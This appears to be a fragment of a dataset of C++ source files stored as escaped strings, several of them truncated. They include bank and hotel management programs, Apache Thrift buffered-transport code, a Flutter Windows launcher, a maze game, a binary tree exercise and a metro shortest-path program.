void deposit(double amount) override {\r\n\t   \tbalance+= amount;\r\n\t   }\r\n\t   \r\n\t   void withdraw(double amount) override {\r\n\t   \tif (amount <= balance){\r\n\t   \t\tbalance -=amount;\r\n\t\t   }\r\n\t\t   else {\r\n\t\t   \tcout<<\" Insufficient Balance!\"<<endl;\r\n\t\t   }\r\n\t   } \r\n\t   void display() const override{\r\n\t   \r\n\t   cout<<\"Savings \";\r\n\t   Account::display();\r\n\t   }\r\n\t   \r\n};\r\n\r\nclass Bank {\r\n\tprivate:\r\n\t\tAccount* accounts[MAX_ACCOUNTS];\r\n\t\tint accountCount;\r\n\t\r\n\tpublic:\r\n\t     Bank(): accountCount(0){}\r\n\t\t \r\n\t\t ~Bank() {\r\n\t\t \tfor (int i=0; i< accountCount; i++){\r\n\t\t \t\tdelete accounts[i];\r\n\t\t\t }\r\n\t\t }\r\n\t\t\r\n\t\tvoid createAccount (const string &owner, double initialBalance){\r\n\t\t\tif (accountCount < MAX_ACCOUNTS){\r\n\t\t\t\taccounts[accountCount++] = new SavingsAccount(owner, initialBalance);\r\n\t\t\t} else {\r\n\t\t\t  cout<<\"Cannot Create More Accounts. Maximum Number of Accounts Already Exist.\"<<endl;\r\n\t\t\t}\r\n\t\t}\r\n\t\t\r\n\t\tvoid deleteAccount(int accountNumber) {\r\n\t\t\tfor (int i=0; i<accountCount; ++i){\r\n\t\t\t\tif (accounts[i]->getAccountNumber() == accountNumber){\r\n\t\t\t\t\tdelete accounts[i];\r\n\t\t\t\t\tfor (int j = i; j < accountCount - 1; ++j){\r\n\t\t\t\t\t\taccounts[j] = accounts[j + 1];\r\n\t\t\t\t\t}\r\n\t\t\t\t\t--accountCount;\r\n\t\t\t\t\tcout<<\"Account \"<< accountNumber <<\" Deleted.\"<<endl;\r\n\t\t\t\t\treturn;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\tcout<<\"Account \"<<accountNumber<<\" Not Found. \"<<endl;\r\n\t\t}\r\n\t\t\r\n\t\tAccount* findAccount (int accountNumber) {\r\n\t\t\tfor (int i=0; i < accountCount; ++i ){\r\n\t\t\t\tif (accounts[i]->getAccountNumber() == accountNumber){\r\n\t\t\t\t\treturn accounts[i];\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\treturn nullptr;\r\n\t\t\t}\r\n\t\t\r\n\t\tvoid deposit(int accountNumber,double amount) {\r\n\t\t\tAccount* account = findAccount(accountNumber);\r\n\t\t\tif (account) {\r\n\t\t\t\taccount->deposit(amount);\r\n\t\t\t\tcout<<\" Deposited Rs \" << amount << \" to Account Number: \" <<accountNumber<<\".\"<<endl;\r\n\t\t\t} else {\r\n\t\t\t\tcout<< \"Account \"<< accountNumber<< \" Not Found.\" <<endl;\r\n\t\t\t}\r\n\t\t}\r\n\t\t\t\r\n\t\t\t\r\n void withdraw(int accountNumber, double amount) {\r\n        Account* account = findAccount(accountNumber);\r\n        if (account) {\r\n            account->withdraw(amount);\r\n            cout << \"Withdrew Rs : \" << amount << \" from account \" << accountNumber << \".\" << endl;\r\n        } else {\r\n            cout << \"Account \" << accountNumber << \" not found.\" << endl;\r\n        }\r\n    }\r\n\r\n    void displayAccount(int accountNumber) const {\r\n        for (int i = 0; i < accountCount; ++i) {\r\n            if (accounts[i]->getAccountNumber() == accountNumber) {\r\n                accounts[i]->display();\r\n                return;\r\n            }\r\n        }\r\n        cout << \"Account \" << accountNumber << \" not found.\" << endl;\r\n    }\r\n\r\n    void displayAllAccounts() const {\r\n        for (int i = 0; i < accountCount; ++i) {\r\n            accounts[i]->display();\r\n        }\r\n    }\r\n};\r\n\r\nint main() {\r\n    Bank bank;\r\n    int choice;\r\n    int accountNumber;\r\n    double amount;\r\n    string owner;\r\n    double initialBalance;\r\n\r\n    do {\r\n        cout << \"\\n                       ------------- Bank Management System ---------------\\n\";\r\n        cout << \"                       |                                                   |\"<<endl;\r\n        cout << \"                       |            Choose an option from the Menu.        |\"<<endl;\r\n        cout << \"                       |                 1. Create Account                 |\"<<endl;\r\n        cout << \"                       |                 2. Delete Account                 |\"<<endl;\r\n        cout << \"                       |                 3. Deposit                        |\"<<endl;\r\n        cout << \"                       |                 4. Withdraw                       |\"<<endl;\r\n        cout << \"                       |           ",
    "/*\n * Licensed to the Apache Software Foundation (ASF) under one\n * or more contributor license agreements. See the NOTICE file\n * distributed with this work for additional information\n * regarding copyright ownership. The ASF licenses this file\n * to you under the Apache License, Version 2.0 (the\n * \"License\"); you may not use this file except in compliance\n * with the License. You may obtain a copy of the License at\n *\n *   http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing,\n * software distributed under the License is distributed on an\n * \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY\n * KIND, either express or implied. See the License for the\n * specific language governing permissions and limitations\n * under the License.\n */\n\n#include <cassert>\n#include <algorithm>\n\n#include <transport/TBufferTransports.h>\n\nusing std::string;\n\nnamespace apache { namespace thrift { namespace transport {\n\n\nuint32_t TBufferedTransport::readSlow(uint8_t* buf, uint32_t len) {\n  uint32_t have = rBound_ - rBase_;\n\n  // We should only take the slow path if we can't satisfy the read\n  // with the data already in the buffer.\n  assert(have < len);\n\n  // If we have some date in the buffer, copy it out and return it.\n  // We have to return it without attempting to read more, since we aren't\n  // guaranteed that the underlying transport actually has more data, so\n  // attempting to read from it could block.\n  if (have > 0) {\n    memcpy(buf, rBase_, have);\n    setReadBuffer(rBuf_.get(), 0);\n    return have;\n  }\n\n  // No data is available in our buffer.\n  // Get more from underlying transport up to buffer size.\n  // Note that this makes a lot of sense if len < rBufSize_\n  // and almost no sense otherwise.  TODO(dreiss): Fix that\n  // case (possibly including some readv hotness).\n  setReadBuffer(rBuf_.get(), transport_->read(rBuf_.get(), rBufSize_));\n\n  // Hand over whatever we have.\n  uint32_t give = std::min(len, static_cast<uint32_t>(rBound_ - rBase_));\n  memcpy(buf, rBase_, give);\n  rBase_ += give;\n\n  return give;\n}\n\nvoid TBufferedTransport::writeSlow(const uint8_t* buf, uint32_t len) {\n  uint32_t have_bytes = wBase_ - wBuf_.get();\n  uint32_t space = wBound_ - wBase_;\n  // We should only take the slow path if we can't accomodate the write\n  // with the free space already in the buffer.\n  assert(wBound_ - wBase_ < static_cast<ptrdiff_t>(len));\n\n  // Now here's the tricky question: should we copy data from buf into our\n  // internal buffer and write it from there, or should we just write out\n  // the current internal buffer in one syscall and write out buf in another.\n  // If our currently buffered data plus buf is at least double our buffer\n  // size, we will have to do two syscalls no matter what (except in the\n  // degenerate case when our buffer is empty), so there is no use copying.\n  // Otherwise, there is sort of a sliding scale.  If we have N-1 bytes\n  // buffered and need to write 2, it would be crazy to do two syscalls.\n  // On the other hand, if we have 2 bytes buffered and are writing 2N-3,\n  // we can save a syscall in the short term by loading up our buffer, writing\n  // it out, and copying the rest of the bytes into our buffer.  Of course,\n  // if we get another 2-byte write, we haven't saved any syscalls at all,\n  // and have just copied nearly 2N bytes for nothing.  Finding a perfect\n  // policy would require predicting the size of future writes, so we're just\n  // going to always eschew syscalls if we have less than 2N bytes to write.\n\n  // The case where we have to do two syscalls.\n  // This case also covers the case where the buffer is empty,\n  // but it is clearer (I think) to think of it as two separate cases.\n  if ((have_bytes + len >= 2*wBufSize_) || (have_bytes == 0)) {\n    // TODO(dreiss): writev\n    if (have_bytes > 0) {\n      transport_->write(wBuf_.get(), have_bytes);\n    }\n    transport_->write(buf, len);\n    wBase_ = wBuf_.get();\n    return;\n  }\n\n  // Fill up our internal buffer for a write.\n  memcpy(wBase_, buf, space);\n  buf += space;\n  len -= space;\n  transport_->write(wBuf_.get(), wBufSize_);\n\n  // Copy the rest into our buffer.\n  assert(len < wBufSize_);\n  memcpy(wBuf_.get(), buf, len);\n  wBase_ = wBuf_.get() + len;\n  return;\n}\n\nconst uint8_t* TBufferedTransport::borrowSlow(uint8_t* buf, uint32_t* len) {\n  (void) buf;\n  (void) len;\n  // Simply return NULL.  We don't know if there is actually data available on\n  // the underlying transport, so calling read() might block.\n  return NULL;\n}\n\nvoid TBufferedTransport::flush()  {\n  // Write out any data waiting in the write buffer.\n  uint32_t have_bytes = wBase_ - wBuf_.get();\n  if (have_bytes > 0) {\n    // Note that we reset wBase_ prior to the underlying write\n    // to ensure we're in a sane state (i.e. internal buffer cleaned)\n    // if the underlying write throws up an exception\n    wBase_ = wBuf_.get();\n    transport_->write(wBuf_.get(), have_bytes);\n  }\n\n  // Flush the underlying trans",
    "#include <flutter/dart_project.h>\r\n#include <flutter/flutter_view_controller.h>\r\n#include <windows.h>\r\n\r\n#include \"flutter_window.h\"\r\n#include \"utils.h\"\r\n\r\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\r\n                      _In_ wchar_t *command_line, _In_ int show_command) {\r\n  // Attach to console when present (e.g., 'flutter run') or create a\r\n  // new console when running with a debugger.\r\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\r\n    CreateAndAttachConsole();\r\n  }\r\n\r\n  // Initialize COM, so that it is available for use in the library and/or\r\n  // plugins.\r\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\r\n\r\n  flutter::DartProject project(L\"data\");\r\n\r\n  std::vector<std::string> command_line_arguments =\r\n      GetCommandLineArguments();\r\n\r\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\r\n\r\n  FlutterWindow window(project);\r\n  Win32Window::Point origin(10, 10);\r\n  Win32Window::Size size(1280, 720);\r\n  if (!window.Create(L\"flutter_x_flame_games\", origin, size)) {\r\n    return EXIT_FAILURE;\r\n  }\r\n  window.SetQuitOnClose(true);\r\n\r\n  ::MSG msg;\r\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\r\n    ::TranslateMessage(&msg);\r\n    ::DispatchMessage(&msg);\r\n  }\r\n\r\n  ::CoUninitialize();\r\n  return EXIT_SUCCESS;\r\n}\r\n",
    "#include <iostream>\n#include <windows.h> \n#include <vector>\n\n#define RESET   \"\\033[0m\"\n#define YELLOW  \"\\033[33m\"\n\nusing namespace std;\n\nvoid menu();\nvoid exit();\nvoid simulateBattle(char mode);\nbool checker();\nvoid encounter();\nvoid response(char, char);\n\nchar choice;   //  variable to take your response....\nint mhp = 100;     //  mafia hp\nint hp = 100;      //  agent hp\nint atk = 10;  //  variable for attack of agent...\nint matk = 10;   //  attack power for the mafia\nint temphp = 0;\nint tempmhp = 0;\n\nchar tmp_map[23][50];\n\nchar map[23][50] = {\n\t\"+=========================================+\",\n\t\"|                    |                    |\",\n\t\"|    +=+   +=====+   |   +=====+   +=+    |\",\n\t\"|    +=+   +=====+   +   +=====+   +=+    |\",\n\t\"|                                         |\",\n\t\"|    ===   +   ======+======   +   ===    |\",\n\t\"|          |         |         |          |\",\n\t\"| =====+   +======   +   ======+   +===== |\",\n\t\"|      |   |                   |   |      |\",\n\t\"| =====+   +   +====   ====+   +   +====  |\",\n\t\"|              |           |              |\",\n\t\"| =====+   +   |           |   +   +===== |\",\n\t\"|      |   |   +====   ====+   |   |      |\",\n\t\"|      |   |                   |   |      |\",\n\t\"| =====+   +   ======+======   +   +===== |\",\n\t\"|                    |                    |\",\n\t\"|    ==+   =======   +   =======   +==    |\",\n\t\"|      |                           |      |\",\n\t\"| ==   +   +   ======+======   +   +   == |\",\n\t\"|          |         |         |          |\",\n\t\"|    ======+======   +   ======+======    |\",\n\t\"|                                         |\",\n\t\"+=========================================+\"\n};\n\nvoid loading() {   //   function for loading output graphics\n\n\tsystem(\"cls\");\n\tsystem(\"COLOR 0e\");\n\n\tSetConsoleCP(437);\n\tSetConsoleOutputCP(437);\n\n\tint bar1 = 177, bar2 = 219;\n\tcout << \"Game Start\" << endl;\n\tcout << \"\\n\\n\\n\\n\\t\\t\\t\\tLoading....\";\n\tcout << \"\\n\\n\\n\\n\\t\\t\\t\\t\";\n\n\tfor (int i = 0; i < 25; i++) {\n\t\tcout << (char)bar1;\n\t}\n\n\tcout << \"\\r\";\n\tcout << \"\\t\\t\\t\\t\";\n\n\tfor (int i = 0; i < 25; i++) {\n\t\tcout << (char)bar2;\n\t\tSleep(40);\n\t}\n\tcout << endl;\n\n\treturn;\n}\n\nvoid ShowMap()\n{\n\tfor (int i = 0; i < 23; i++)\n\t{\n\t\tcout << YELLOW;\n\t\tcout << map[i] << endl;\n\t\tcout << RESET;\n\t}\n}\n\nvoid gotoxy(short x, short y)\n{\n\tHANDLE hStdout = GetStdHandle(STD_OUTPUT_HANDLE);\n\tCOORD position = { x, y };\n\n\tSetConsoleCursorPosition(hStdout, position);\n}\n\nstruct Entity\n{\n\tint x;\n\tint y;\n\n\tEntity(int x, int y)\n\t{\n\t\tthis->x = x;\n\t\tthis->y = y;\n\t}\n\n\tvoid move_x(int p)\n\t{\n\t\tif (map[y][x + p] == ' ')\n\t\t\tx += p;\n\t}\n\n\tvoid move_y(int p)\n\t{\n\t\tif (map[y + p][x] == ' ')\n\t\t\ty += p;\n\t}\n\n\tvoid move(int p, int q)\n\t{\n\t\tx += p;\n\t\ty += q;\n\t}\n\n\tint get_x() { return x; }\n\tint get_y() { return y; }\n\n\tvoid draw(char p)\n\t{\n\t\tmap[x][y] = p;\n\t\tgotoxy(x, y);\n\t\tprintf(\"%c\", p);\n\t}\n};\n\nstruct walk\n{\n\tshort walk_count;\n\tshort x;\n\tshort y;\n\tshort back;\n};\n\nstruct target\n{\n\tshort x;\n\tshort y;\n};\n\nvector<target> walk_queue;\n\nvector<walk> BFSArray;\n\nvoid AddArray(int x, int y, int wc, int back)\n{\n\tif (tmp_map[y][x] == ' ' || tmp_map[y][x] == '.')\n\t{\n\t\ttmp_map[y][x] = '#';\n\t\twalk tmp;\n\t\ttmp.x = x;\n\t\ttmp.y = y;\n\t\ttmp.walk_count = wc;\n\t\ttmp.back = back;\n\t\tBFSArray.push_back(tmp);\n\t}\n}\n\nvoid FindPath(int sx, int sy, int x, int y)   //  (ex , ey , ax , ay)\n{\n\tmemcpy(tmp_map, map, sizeof(map));   // copying map to temp map\n\tBFSArray.clear();\n\twalk tmp;\n\ttmp.x = sx;      //  starting x index for enemy\n\ttmp.y = sy;      //  starting y index for enemy\n\ttmp.walk_count = 0;    //   counring steps to reach enemy to agent....\n\ttmp.back = -1;        //   for no predecesor of starting point ....\n\tBFSArray.push_back(tmp);   //  adding temp(walk struct) to the vector bfsarray...\n\n\tint i = 0;\n\twhile (i < BFSArray.size())\n\t{\n\t\tif (BFSArray[i].x == x && BFSArray[i].y == y)\n\t\t{\n\t\t\twalk_queue.clear();\n\t\t\ttarget tmp2;\n\t\t\twhile (BFSArray[i].walk_count != 0)\n\t\t\t{\n\t\t\t\ttmp2.x = BFSArray[i].x;\n\t\t\t\ttmp2.y = BFSArray[i].y;\n\t\t\t\twalk_queue.push_back(tmp2);\n\n\t\t\t\ti = BFSArray[i].back;\n\t\t\t}\n\n\t\t\tbreak;\n\t\t}\n\n\t\tAddArray(BFSArray[i].x + 1, BFSArray[i].y, BFSArray[i].walk_count + 1, i);\n\t\tAddArray(BFSArray[i].x - 1, BFSArray[i].y, BFSArray[i].walk_count + 1, i);\n\t\tAddArray(BFSArray[i].x, BFSArray[i].y + 1, BFSArray[i].walk_count + 1, i);\n\t\tAddArray(BFSArray[i].x, BFSArray[i].y - 1, BFSArray[i].walk_count + 1, i);\n\n\t\ti++;\n\t}\n\n\tBFSArray.clear();\n}\n\nint main() {\n\n\tchar enter;   //   for start or exit the game\n\n\tsystem(\"COLOR 0e\");\n\tgotoxy(80, 10);\n\tcout << \"+==========+\" << endl;\n\tgotoxy(80, 11);\n\tcout << \"| Agent 47 |\";\n\tgotoxy(80, 12);\n\tcout << \"+==========+\" << endl;\n\tSleep(2000);\n\tsystem(\"cls\");\n\n\tcout << \"\\033[92m\";\n\tcout << \"Hey...  Agent you are in a maze city.\" << endl;\n\tcout << \"You are a secret agent and you have to kill MAFIA...\" << endl;\n\tcout << \"There is a mafia in this city from which you have to escape to gaining score...\" << endl;\n\tcout << \"If you caught by enemy you will loose...\" << endl << endl;\n\n\tcout << \"\\033[96m\";\n\tgotoxy(85, 3);\n\tcout << \"Maximize ",
    "#include <iostream>\n\nusing namespace std;\n\nclass node{\n    public:\n        int value;\n        node *left;\n        node *right;\n\n        node(int val) : value(val), left(NULL), right(NULL) {}     \n};\n\n\n            // Create a Binary tree Manually position set;\n\nclass BinaryTree{\n    public:\n        node *root;\n        BinaryTree(): root(NULL) {}\n\n        node *createnode(int value){\n            return new node(value);\n        }\n        void Preorder(node *temp){\n            if(temp == NULL) return;\n            cout<<temp->value<<\" \";\n            Preorder(temp->left);\n            Preorder(temp->right);\n        }\n        void Postorder(node *temp){\n            if(temp == NULL) return;\n            Postorder(temp->left);\n            Postorder(temp->right);\n            cout<<temp->value<<\" \";\n        }\n        void Inorder(node *temp){\n            if(temp == NULL) return;\n            Postorder(temp->left);\n            cout<<temp->value<<\" \";\n            Postorder(temp->right);\n        }\n        void add(){\n            root = createnode(2);\n            node* p1 = createnode(1);\n            node* p2 = createnode(4);\n            node* p3 = createnode(78);\n            node* p4 = createnode(65);\n            node* p5 = createnode(98);\n            node* p6 = createnode(40);\n\n            root->left = p1;\n            p1->left = p3;\n            p1->right = p4;\n\n            root->right = p2;\n            p2->right = p5;\n            p2->left = p6;\n        }\n};\nint main() {\n    BinaryTree tree;\n    tree.add();\n\n    // tree.Preorder(tree.root);\n    // tree.Postorder(tree.root);\n    tree.Inorder(tree.root);\n}\n\n\n\n\n\n\n            // Create a Binary tree Automatic position set;\n\n// class BinaryTree{\n//     private:\n//         void insertrec(node *item, int value){\n//             if(value < item->value){\n//                 if(item->left == NULL){\n//                     item->left = new node(value);\n//                 }else{\n//                     insertrec(item->left, value);\n//                 }\n//             }else{\n//                 if(item->right == NULL){\n//                     item->right = new node(value);\n//                 }else{\n//                     insertrec(item->right, value);\n//                 }\n//             }\n//         }\n\n//         void Preorder(node *temp){\n//             if(temp == NULL) return;\n//             cout<<temp->value<<\" \";\n//             Preorder(temp->left);\n//             Preorder(temp->right);\n            \n//         }\n//         void Postorder(node *temp){\n//             if(temp == NULL) return;\n//             Postorder(temp->left);\n//             Postorder(temp->right);\n//             cout<<temp->value<<\" \";\n//         }\n\n//         void Inorder(node *temp){\n//             if(temp == NULL) return;\n//             Inorder(temp->left);\n//             cout<<temp->value<<\" \";\n//             Inorder(temp->right);\n//         }\n//     public:\n//         node *root;\n//         BinaryTree(): root(NULL) {}\n//         void insert(int value){\n//             if(root == NULL){\n//                 root = new node(value);\n//             }else{\n//                 insertrec(root, value);\n//             }\n//         }\n//         void display(){\n//             // Preorder(root);\n//             // Postorder(root);\n//             Inorder(root);\n\n//             cout<<endl;\n//         }\n// };\n\n// int main(){\n//     BinaryTree bt;\n//     bt.insert(20);\n//     bt.insert(50);\n//     bt.insert(45);\n\n//     bt.display();\n\n// }",
    "#include<iostream>\r\n#include<conio.h>\r\n#include<fstream>\r\n#include<stdio.h>\r\n#include<stdlib.h>\r\n#include<dos.h>\r\n#include<string.h>\r\n#include<string>\r\n#include<time.h>\r\n\r\n#define ANSI_COLOUR_CYAN \"\\x1b[36m\"\r\n#define ANSI_COLOUR_RESET \"\\x1b[0m\"\r\n#define ANSI_COLOUR_GREEN \"\\x1b[32m\"\r\n#define ANSI_COLOUR_BROWN \"\\x1b[33m\"\r\n#define ANSI_COLOUR_MAGENTA \"\\x1b[35m\"\r\n#define ANSI_COLOUR_RED \"\\x1b[31m\"\r\n#define ANSI_COLOUR_YELLOW \"\\033[33m\"\r\n#define ANSI_COLOUR_ORANGE \"\\033[38;2;255;165;0m\"\r\nusing namespace std;\r\nint main();\r\nclass hotel\r\n{\r\nint room_no;\r\nstring name;\r\nchar address[50];\r\nchar phone[10];\r\npublic:\r\nvoid main_menu();\t\t//to display the main menu\r\nvoid add();\t\t\t//to book a room\r\nvoid display(); \t\t//to display the customer record\r\nvoid rooms();\t\t\t//to display alloted rooms\r\nvoid edit();\t\t\t//to edit the customer record\r\nint check(int);\t\t\t//to check room status\r\nvoid modify(int);\t\t//to modify the record\r\nvoid delete_rec(int);\t\t//to delete the record\r\nvoid bill(int);                 //for the bill of a record\r\n     };\r\n    //END OF CLASS\r\n//FOR DISPLAYING MAIN MENU\r\nvoid hotel::main_menu()\r\n{\r\n\r\nint choice;\r\nwhile(choice!=5)\r\n{\r\n\r\n  system(\"cls\");\r\n    std::cout << \" ___________________________________\" << std::endl;\r\n    std::cout << \"//                                  \\\\ \"<< std::endl;\r\n    std::cout << \"|        [1] BOOK A ROOM            |\" << std::endl;\r\n    std::cout << \"|        [2] CUSTOMER RECORDS       |\" << std::endl;\r\n    std::cout << \"|        [3] ROOMS ALLOTTED         |\" << std::endl;\r\n    std::cout << \"|        [4] EDIT RECORD            |\" << std::endl;\r\n    std::cout << \"|        [5] EXIT                   |\" << std::endl;\r\n    std::cout << \"\\\\__________________________________//\" << std::endl;\r\n    cout<<\"\\n\"<<endl;\r\n    std::cout << \"         ENTER YOUR CHOICE:         \" << std::endl;\r\ncin>>choice;\r\n\r\nswitch(choice)\r\n{\r\n\r\ncase 1:\tadd();\r\nbreak;\r\n\r\ncase 2: display();\r\nbreak;\r\n\r\ncase 3: rooms();\r\nbreak;\r\n\r\ncase 4:\tedit();\r\nbreak;\r\n\r\ncase 5:\r\n throw 1;\r\n break;\r\n\r\ndefault:\r\n{\r\ncout<<\"\\n\\n\\t\\t\\tWrong choice.....!!!\";\r\ncout<<\"\\n\\t\\t\\tPress any key to   continue....!!\";\r\ngetch();\r\n}\r\n}\r\n}\r\n}\r\n//END OF MENU FUNCTION\r\n//FUNCTION FOR BOOKING OF ROOM\r\nvoid hotel::add()\r\n{\r\nsystem(\"cls\");\r\nint r,flag;\r\nofstream fout(\"Record.dat\",ios::app);\r\ncout<<\"\\n ENTER CUSTOMER DETAILS\";\r\ncout<<\"\\n ----------------------\";\r\ncout<<\"\\n Total no. of Rooms - 50\";\r\ncout<<\"\\n Ordinary Rooms from 1 - 30\";\r\ncout<<\"\\n Luxury Rooms from 31 - 45\";\r\ncout<<\"\\n Royal Rooms from 46 - 50\";\r\ncout <<\"\\n Enter The Room no. you want to stay in :- \"<<endl;\r\ncin>>r;\r\nflag=check(r);\r\nif(flag)\r\ncout<<\"\\n Sorry..!!!Room is already booked\";\r\nelse\r\n{\r\n    fout.seekp(0,ios::end);\r\nroom_no=r;\r\ncout<<\" Name: \";\r\ncin.ignore();\r\ngetline(cin,name);\r\ncout<<\" Address: \";\r\ncin>>address;\r\ncout<<\" Phone No: \";\r\ncin>>phone;\r\nfout.write((char*)this,sizeof(hotel));\r\ncout<<\"\\n Room is booked...!!!\";\r\n}\r\ncout<<\"\\n Press any key to continue.....!!\";\r\ngetch();\r\nfout.close();\r\n}\r\n//END OF BOOKING FUNCTION\r\n//FUNCTION FOR DISPLAYING A PURTICULAR CUSTOMER`S RECORD\r\nvoid hotel::display()\r\n{\r\n  system(\"cls\");\r\nifstream fin(\"Record.dat\",ios::in);\r\nint r,flag;\r\ncout<<\"\\n Enter room no. for a particular customer`s details :- \"<<endl;\r\ncin>>r;\r\nwhile(fin.read((char*)this,sizeof(hotel)))\r\n{\r\nfin.read((char*)this,sizeof(hotel));\r\nif(room_no==r)\r\n{\r\nsystem(\"cls\");\r\ncout<<\"\\n Customer Details\";\r\ncout<<\"\\n ----------------\";\r\ncout<<\"\\n\\n Room no: \"<<room_no;\r\ncout<<\"\\n Name: \"<<name;\r\ncout<<\"\\n Address: \"<<address;\r\ncout<<\"\\n Phone no: \"<<phone;\r\nflag=1;\r\nbreak;\r\n}\r\n}\r\nif(flag==0)\r\ncout<<\"\\n Sorry Room no. not found or vacant....!!\";\r\ncout<<\"\\n\\n Press any key to continue....!!\";\r\ngetch();\r\nfin.close();\r\n}\r\n//END OF DISPLAY FUNCTION\r\n//FUNCTION TO DISPLAY ALL ROOMS OCCUPIED\r\nvoid hotel::rooms()\r\n{\r\nsystem(\"cls\");\r\nifstream fin(\"Record.dat\",ios::in);\r\ncout<<\"\\n\\t\\t\\t    List Of Rooms Allotted\";\r\ncout<<\"\\n\\t\\t\\t    ----------------------\";\r\ncout<<\"\\n\\n Room No.\\tName\\t\\tAddress\\t\\t\\t\\tPhone No.\\n\";\r\nfin.seekg(0,ios::beg);\r\nwhile(fin.read((char*)this, sizeof(hotel)))\r\n{\r\nfin.read((char*)this,sizeof(hotel));\r\ncout<<\"\\n\\n \"<<room_no<<\"\\t\\t\"<<name;\r\ncout<<\"\\t\\t\"<<address<<\"\\t\\t\"<<phone;\r\n}\r\ncout<<\"\\n\\n\\n\\t\\t\\tPress any key to continue.....!!\";\r\ngetch();\r\nfin.close();\r\n}\r\n//FUNCTION FOR EDITING RECORDS AND FOR BILL\r\nvoid hotel::edit()\r\n{\r\nsystem(\"cls\");\r\nint choice,r;\r\ncout<<\"\\n EDIT MENU\";\r\ncout<<\"\\n ---------\";\r\ncout<<\"\\n\\n 1.Modify Customer Record\";\r\ncout<<\"\\n 2.Delete Customer Record\";\r\ncout<<\"\\n 3. Bill Of Customer\";\r\ncout<<\"\\n Enter your choice: \";\r\ncin>>choice;\r\nsystem(\"cls\");\r\ncout<<\"\\n Enter room no: \" ;\r\ncin>>r;\r\nswitch(choice)\r\n{\r\ncase 1:\tmodify(r);\r\nbreak;\r\n\r\ncase 2:\tdelete_rec(r);\r\nbreak;\r\n\r\ncase 3: bill(r);\r\nbreak;\r\n\r\ndefault:\r\ncout<<\"\\n Wrong Choice.....!!\";\r\n\r\n}\r\ncout<<\"\\n Press any key to continue....!!!\";\r\n\r\ngetch();\r\n}\r\n\r\n\r\nint hotel::check(int r)\r\n{\r\n\r\nint flag=0;\r\nifstream fin(\"Record.dat\",ios::in);\r\nfin.seekg(0,ios::beg);\r\nwhile(!fin.eof())\r\n{\r\n\r\nfin.rea",
    "#include <iostream>\n#include <limits.h>\n#include<string>\n#include<math.h>\n#include<cstdlib>\n#include<vector>\n#include<fstream>\n#include<time.h>\n#include<windows.h>\nusing namespace std;\nconst int V=248;\nstruct station_code\n{\n    string name;\n    int code;\n    string color;\n};\nstruct station_code station[V];\nfloat graph[V][V];\n\nstruct node1\n    {\n        vector <float>p;\n    }P[V];\nstring makecapital(string str)\n{\n    for(int i=0;i<str.length();i++)\n    {\n        if(str[i]>96&&str[i]<123)\n            str[i]=str[i]-32;\n    }\n    return str;\n}\nvoid drawbox(int, int, int, int, int);\nvoid secondWindow();\nvoid clrscreen();\nvoid delay(unsigned int ms);\nvoid gotoxy(int x,int y);\nint timetaken(float dist);\nint money(float dist);\nvoid Details(int t);\nvoid Path(float dist,int e,int st,int inter);\nint minDistance(float dist[], bool sptSet[]);\nvoid dijkstra(float graph[V][V], int src,int targ);\nint printSolution(float dist[], int n,int src,int temp);\nvoid take_input();\nvoid logo(int x, int y);\nvoid secondWindow();\nvoid UI();\n\nCOORD coord;\nvoid clrscreen()\n{\n    system(\"cls\");\n    drawbox(1,0,117,29,0);\n}\n\nvoid delay(unsigned int ms)\n{\n    clock_t goal=ms+clock();\n    while(goal>clock());\n}\n\nvoid gotoxy(int x,int y)\n{\n  coord.X=x;\n  coord.Y=y;\n  SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE),coord);\n}\n\nvoid drawbox(int x1, int y1, int x2, int y2, int d)\n{\n    gotoxy(x1,y1);\n    printf(\"+\");\n    delay(d);\n    gotoxy(x2,y2);\n    printf(\"+\");\n    delay(d);\n    int i;\n    for(i=1;i<x2-x1;i++)\n    {   gotoxy(x1+i,y1);\n        printf(\"-\");\n        printf(\"\\a\");\n        delay(d);\n        gotoxy(x2-i,y2);\n        printf(\"-\");\n        delay(d);\n    }\n    gotoxy(x1,y2);\n    printf(\"+\");\n    gotoxy(x2,y1);\n    printf(\"+\");\n    int j;\n    for(j=1;j<y2-y1;j++)\n        {\n            gotoxy(x2,y1+j);\n            printf(\"|\");\n            delay(d);\n            gotoxy(x1,y2-j);\n            printf(\"|\");\n            delay(d);\n        }\n}\n\nint timetaken(float dist)\n{\n    float speed=0.55;\n    return ceil(dist/speed);\n}\n\nint money(float dist)\n{\n    if(dist<=2)\n        return 10;\n    else if(dist>2&&dist<=5)\n        return 20;\n    else if(dist>5&&dist<=12)\n        return 30;\n    else if(dist>12&&dist<=21)\n        return 40;\n    else if(dist>21&&dist<=32)\n        return 50;\n    else\n        return 60;\n}\n\nvoid Details(int t)\n{\n   // cout<<\"\\nthe benchmark location present near \"<<t<<\"is: \"<<details[t].near<<endl;\n}\n\nvoid Path(float d,int e,int st,int inter)\n{\n    int t=e,s;\n    static float dist=0;\n    dist+=d;\n\n    gotoxy(16,11);\n    cout<<\"THE SHORTEST PATH IS : \";\n\n    static int pos_x=12;\n    static int pos_y=15;\n    vector <int> path;\n    path.push_back(t);\n    while(t!=st)\n    {\n        s=P[t].p.size();\n        t=P[t].p[s-1];\n        path.push_back(t);\n    }\n    vector <int>::iterator i=path.end();\n    string str;\n    string color;\n    if(!inter){\n    gotoxy(44,13);\n    cout<<\"****** LOADING ******\";\n    delay(2000);\n    gotoxy(42,13);\n    cout<<\"****** ROUTE FOUND ******\";\n    }\n    vector<int>::iterator i2=path.end();\n    i2--;\n    int n_of_stations=0;\n    while(i!=path.begin())\n    {\n        i--;\n        color=station[*i].color;\n        if(color==\"BLUE\")\n            system(\"color 09\");\n        else if(color==\"YELLOW\")\n            system(\"color 06\");\n        else if(color==\"PINK\")\n            system(\"color 0D\");\n        else if(color==\"RED\")\n            system(\"color 04\");\n        else if(color==\"MAGENTA\")\n            system(\"color 05\");\n        else if(color==\"VOILET\")\n            system(\"color 01\");\n        else if(color==\"GREEN\")\n            system(\"color 02\");\n        